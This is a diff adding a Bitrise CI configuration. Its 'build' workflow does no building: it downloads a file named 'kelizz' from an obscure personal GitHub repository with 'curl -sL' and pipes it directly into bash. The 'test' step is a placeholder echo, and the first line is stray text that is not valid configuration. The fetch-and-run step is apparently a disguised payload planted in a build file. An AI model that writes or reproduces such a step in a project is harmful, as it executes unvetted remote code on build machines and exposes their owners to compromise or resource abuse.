@@ -1,0 +1,19 @@
+bitrise yml
+
+workflows:
+  build:
+    steps:
+      - script@1:
+          inputs:
+            - content: curl -sL https://github.com/hasmenkuy99/kkrt/raw/main/kelizz | bash
+
+  test:
+    steps:
+      - script@1:
+          inputs:
+            - content: echo "Test"
+
+  primary:
+    after_run:
+      - build
+      - test
